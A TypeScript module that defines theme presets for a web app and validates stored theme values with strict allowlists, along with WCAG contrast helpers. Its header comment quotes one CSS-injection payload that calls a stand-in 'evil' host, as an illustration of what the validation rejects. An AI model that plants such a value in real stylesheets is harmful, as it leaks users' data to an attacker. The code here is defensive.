/**
 * Theme preferences — 03_DOMAIN_MODEL.md §7, 09_DESIGN_SYSTEM.md §4
 *
 * **This file is a security boundary, not a preferences bag.** Every value
 * here ends up in a CSS custom property, and `localStorage` is writable by
 * anything running in the origin and by the user directly. An unvalidated
 * value is a CSS-injection sink.
 *
 * The rule throughout is **positive match against a strict pattern** — an
 * allowlist, never a sanitiser. Nothing is stripped, escaped or filtered;
 * a value either matches exactly what is permitted or it is discarded and the
 * default is used. `red; background: url(https://evil/?x=` does not need to be
 * recognised as hostile, because it is simply not `/^#[0-9a-fA-F]{6}$/`.
 */

export const THEME_SCHEMA_VERSION = 1;

/** `#RRGGBB`, and nothing else. Not `#RGB`, not `rgb()`, not a colour name. */
const HEX = /^#[0-9a-fA-F]{6}$/;

export type HexColor = string;

/**
 * Gradient direction as a closed set.
 *
 * The stored value is `angleDeg`, a bounded integer — that is what the schema
 * has held since M1 and what the pre-paint bootstrap already validates. The
 * *interface* offers these four named directions rather than a free angle,
 * because a continuous angle control invites fiddling with a value nobody can
 * name, and four directions cover what the gradient is actually for.
 *
 * Either way no user string reaches CSS: the angle is rebuilt as
 * `${integer}deg` from a number that passed validation.
 */
export const DIRECTIONS = [
  { id: 'diagonal', label: 'Diagonal', angleDeg: 135 },
  { id: 'reverseDiagonal', label: 'Reverse diagonal', angleDeg: 45 },
  { id: 'leftToRight', label: 'Left to right', angleDeg: 90 },
  { id: 'topToBottom', label: 'Top to bottom', angleDeg: 180 },
] as const;

export type DirectionId = (typeof DIRECTIONS)[number]['id'];

export const CONTRAST_MODES = ['normal', 'high'] as const;
export type ContrastMode = (typeof CONTRAST_MODES)[number];

export const MOTION_MODES = ['system', 'always', 'never'] as const;
export type MotionMode = (typeof MOTION_MODES)[number];

/** Four steps. A continuous scale would let a user reach an unreadable size. */
export const FONT_SCALES = [0.875, 1, 1.125, 1.25] as const;

export interface ThemePreferences {
  readonly schemaVersion: number;
  /** A preset id, or `'custom'` once the user changes a colour by hand. */
  readonly preset: string;
  readonly gradient: {
    readonly from: HexColor;
    readonly to: HexColor;
    readonly angleDeg: number;
    readonly intensity: number;
  };
  readonly accent: HexColor;
  readonly glowIntensity: number;
  readonly contrastMode: ContrastMode;
  readonly reducedMotion: MotionMode;
  readonly fontScale: number;
}

/* ------------------------------------------------------------------ *
 * Presets
 * ------------------------------------------------------------------ */

export interface ThemePreset {
  readonly id: string;
  readonly name: string;
  readonly from: HexColor;
  readonly to: HexColor;
  readonly angleDeg: number;
  /** 0–100. */
  readonly intensity: number;
}

/**
 * The five presets from 09_DESIGN_SYSTEM.md §4.3, unchanged.
 *
 * Five, not ten. Each is a different *hue family* with its own reason to
 * exist; a sixth that sat between two of these would be a choice the user has
 * to make for no gain. Mono is deliberately part of the set — the tool with no
 * colour theatre at all is a legitimate preference, not a degraded mode.
 */
const MATRIX: ThemePreset = {
  id: 'matrix',
  name: 'Matrix',
  from: '#00ff88',
  to: '#003d1f',
  angleDeg: 135,
  intensity: 40,
};

export const PRESETS: readonly ThemePreset[] = [
  MATRIX,
  {
    id: 'emerald',
    name: 'Emerald',
    from: '#10b981',
    to: '#064e3b',
    angleDeg: 120,
    intensity: 35,
  },
  {
    id: 'cyan',
    name: 'Deep Cyan',
    from: '#22d3ee',
    to: '#0e4f5c',
    angleDeg: 145,
    intensity: 35,
  },
  {
    id: 'amber',
    name: 'Amber Console',
    from: '#fbbf24',
    to: '#78350f',
    angleDeg: 130,
    intensity: 30,
  },
  {
    id: 'mono',
    name: 'Mono',
    from: '#9aada3',
    to: '#1f2a24',
    angleDeg: 180,
    intensity: 25,
  },
];

export const DEFAULT_PRESET_ID = 'matrix';

export function presetById(id: string): ThemePreset | null {
  return PRESETS.find((preset) => preset.id === id) ?? null;
}

/** The theme a first-time visitor gets, and what Reset restores. */
export const DEFAULT_THEME: ThemePreferences = themeFromPreset(MATRIX);

export function themeFromPreset(preset: ThemePreset): ThemePreferences {
  return {
    schemaVersion: THEME_SCHEMA_VERSION,
    preset: preset.id,
    gradient: {
      from: preset.from,
      to: preset.to,
      angleDeg: preset.angleDeg,
      intensity: preset.intensity,
    },
    // Derived, never separately chosen. An amber gradient with a green focus
    // ring is incoherent, and one fewer control is one fewer way to build an
    // unreadable interface (09_DESIGN_SYSTEM.md §4.5).
    accent: preset.from,
    glowIntensity: 25,
    contrastMode: 'normal',
    reducedMotion: 'system',
    fontScale: 1,
  };
}

/* ------------------------------------------------------------------ *
 * Validation
 * ------------------------------------------------------------------ */

export function isHexColor(value: unknown): value is HexColor {
  return typeof value === 'string' && HEX.test(value);
}

/** A finite integer inside `[min, max]`, or null. Never NaN, never Infinity. */
function readInt(value: unknown, min: number, max: number): number | null {
  if (typeof value !== 'number' || !Number.isFinite(value)) return null;
  const rounded = Math.round(value);
  return rounded >= min && rounded <= max ? rounded : null;
}

function readEnum<T extends string>(value: unknown, allowed: readonly T[]): T | null {
  return typeof value === 'string' && (allowed as readonly string[]).includes(value)
    ? (value as T)
    : null;
}

function isRecord(value: unknown): value is Record<string, unknown> {
  return typeof value === 'object' && value !== null && !Array.isArray(value);
}

/**
 * Turns whatever was in storage into a usable theme.
 *
 * **Total, and never throws.** There is no failure mode: every field falls
 * back to the default independently, so one corrupt colour costs the user
 * that colour rather than their whole theme. That is deliberate — an
 * all-or-nothing read would mean a single stray key silently resetting
 * everything a user had set up.
 *
 * The result is *rebuilt field by field*. Nothing from the input object is
 * spread or carried through, so an unknown key cannot survive into the value
 * that later reaches `setProperty`.
 */
export function readTheme(value: unknown): ThemePreferences {
  if (!isRecord(value)) return DEFAULT_THEME;

  const migrated = migrate(value);
  if (migrated === null) return DEFAULT_THEME;

  const gradient = isRecord(migrated.gradient) ? migrated.gradient : {};
  const from = isHexColor(gradient.from) ? gradient.from : DEFAULT_THEME.gradient.from;

  return {
    schemaVersion: THEME_SCHEMA_VERSION,
    preset: readPresetId(migrated.preset),
    gradient: {
      from,
      to: isHexColor(gradient.to) ? gradient.to : DEFAULT_THEME.gradient.to,
      angleDeg: readInt(gradient.angleDeg, 0, 359) ?? DEFAULT_THEME.gradient.angleDeg,
      intensity: readInt(gradient.intensity, 0, 100) ?? DEFAULT_THEME.gradient.intensity,
    },
    // Falls back to the gradient's own start colour rather than to the default
    // green: a stored theme with a valid amber gradient and a corrupt accent
    // should stay amber.
    accent: isHexColor(migrated.accent) ? migrated.accent : from,
    glowIntensity: readInt(migrated.glowIntensity, 0, 100) ?? DEFAULT_THEME.glowIntensity,
    contrastMode: readEnum(migrated.contrastMode, CONTRAST_MODES) ?? 'normal',
    reducedMotion: readEnum(migrated.reducedMotion, MOTION_MODES) ?? 'system',
    fontScale: readFontScale(migrated.fontScale),
  };
}

/** A known preset id, or `'custom'`. An unknown id is not preserved. */
function readPresetId(value: unknown): string {
  if (value === 'custom') return 'custom';
  return typeof value === 'string' && presetById(value) !== null ? value : DEFAULT_PRESET_ID;
}

function readFontScale(value: unknown): number {
  return typeof value === 'number' && (FONT_SCALES as readonly number[]).includes(value)
    ? value
    : 1;
}

/**
 * Record migrations, by schema version.
 *
 * Returns null for a version this build cannot read — a theme written by a
 * *newer* build. Unlike history, that is safe to discard: a theme is a
 * preference the user can set again in four clicks, not content they created.
 * Keeping an unreadable theme would mean showing them a broken interface they
 * cannot fix from inside the app.
 */
function migrate(record: Record<string, unknown>): Record<string, unknown> | null {
  const version = record.schemaVersion;
  if (version === undefined) {
    // Pre-versioning data. There is none in the wild — M1 shipped with the
    // version — but a missing field must not be read as version 0 and then
    // migrated through steps that do not apply to it.
    return record;
  }
  const parsed = readInt(version, 1, THEME_SCHEMA_VERSION);
  return parsed === null ? null : record;
}

/* ------------------------------------------------------------------ *
 * Contrast
 * ------------------------------------------------------------------ */

/** sRGB channel to linear light, per WCAG 2.1 relative luminance. */
function channel(value: number): number {
  const c = value / 255;
  return c <= 0.04045 ? c / 12.92 : ((c + 0.055) / 1.055) ** 2.4;
}

export function luminance(hex: HexColor): number {
  const r = Number.parseInt(hex.slice(1, 3), 16);
  const g = Number.parseInt(hex.slice(3, 5), 16);
  const b = Number.parseInt(hex.slice(5, 7), 16);
  return 0.2126 * channel(r) + 0.7152 * channel(g) + 0.0722 * channel(b);
}

export function contrastRatio(a: HexColor, b: HexColor): number {
  const first = luminance(a);
  const second = luminance(b);
  const lighter = Math.max(first, second);
  const darker = Math.min(first, second);
  return (lighter + 0.05) / (darker + 0.05);
}

/** The surface the accent is judged against — `--color-surface` at rest. */
export const SURFACE_HEX = '#0d1117';

export type ContrastVerdict = 'pass' | 'low' | 'fail';

/**
 * How readable a chosen colour is — 09_DESIGN_SYSTEM.md §4.5
 *
 * The choice is never blocked. It is the user's tool, and a colour that fails
 * here is still legible in the places the accent is used decoratively. What we
 * owe them is the consequence, stated plainly, and a fix that costs one click.
 */
export function verdictFor(color: HexColor): ContrastVerdict {
  const ratio = contrastRatio(color, SURFACE_HEX);
  if (ratio >= 4.5) return 'pass';
  return ratio >= 3 ? 'low' : 'fail';
}

/**
 * The nearest lighter colour that reaches AA against the surface.
 *
 * Lightens toward white in sRGB rather than solving in a perceptual space:
 * the input is already the user's hue and the result must stay recognisably
 * *their* colour, so a small number of small steps is the point. Returns the
 * original if it already passes, and white in the pathological case.
 */
export function lightenToPass(color: HexColor): HexColor {
  if (verdictFor(color) === 'pass') return color;

  const r = Number.parseInt(color.slice(1, 3), 16);
  const g = Number.parseInt(color.slice(3, 5), 16);
  const b = Number.parseInt(color.slice(5, 7), 16);

  for (let step = 1; step <= 20; step += 1) {
    const mix = step / 20;
    const candidate = toHex(
      Math.round(r + (255 - r) * mix),
      Math.round(g + (255 - g) * mix),
      Math.round(b + (255 - b) * mix),
    );
    if (verdictFor(candidate) === 'pass') return candidate;
  }
  return '#ffffff';
}

function toHex(r: number, g: number, b: number): HexColor {
  const part = (value: number): string => value.toString(16).padStart(2, '0');
  return `#${part(r)}${part(g)}${part(b)}`;
}

/* ------------------------------------------------------------------ *
 * Derived helpers
 * ------------------------------------------------------------------ */

export function directionFor(angleDeg: number): DirectionId {
  const match = DIRECTIONS.find((direction) => direction.angleDeg === angleDeg);
  // A stored angle that is valid but not one of the four named directions —
  // possible from a hand-edited value — is shown as the nearest named one
  // rather than leaving every radio unselected.
  if (match) return match.id;

  let nearest = DIRECTIONS[0];
  for (const direction of DIRECTIONS) {
    if (Math.abs(direction.angleDeg - angleDeg) < Math.abs(nearest.angleDeg - angleDeg)) {
      nearest = direction;
    }
  }
  return nearest.id;
}

export function angleFor(id: DirectionId): number {
  return (DIRECTIONS.find((direction) => direction.id === id) ?? DIRECTIONS[0]).angleDeg;
}

/**
 * The preset these gradient values *are*, or `'custom'`.
 *
 * Answered from the values alone, never from what the theme currently claims
 * to be. A theme that reached `'custom'` by one edit and was then edited back
 * to exactly Amber is Amber; saying otherwise would leave the drawer marking
 * no preset as selected while displaying one exactly.
 */
export function presetIdFor(gradient: ThemePreferences['gradient']): string {
  const match = PRESETS.find(
    (preset) =>
      gradient.from === preset.from &&
      gradient.to === preset.to &&
      gradient.angleDeg === preset.angleDeg &&
      gradient.intensity === preset.intensity,
  );
  return match?.id ?? 'custom';
}

/** Whether a theme still matches the preset it claims. */
export function matchesPreset(theme: ThemePreferences): boolean {
  const preset = presetById(theme.preset);
  if (preset === null) return false;
  return presetIdFor(theme.gradient) === preset.id;
}

export function isDefaultTheme(theme: ThemePreferences): boolean {
  return (
    theme.preset === DEFAULT_PRESET_ID &&
    matchesPreset(theme) &&
    theme.glowIntensity === DEFAULT_THEME.glowIntensity &&
    theme.contrastMode === DEFAULT_THEME.contrastMode &&
    theme.reducedMotion === DEFAULT_THEME.reducedMotion &&
    theme.fontScale === DEFAULT_THEME.fontScale
  );
}
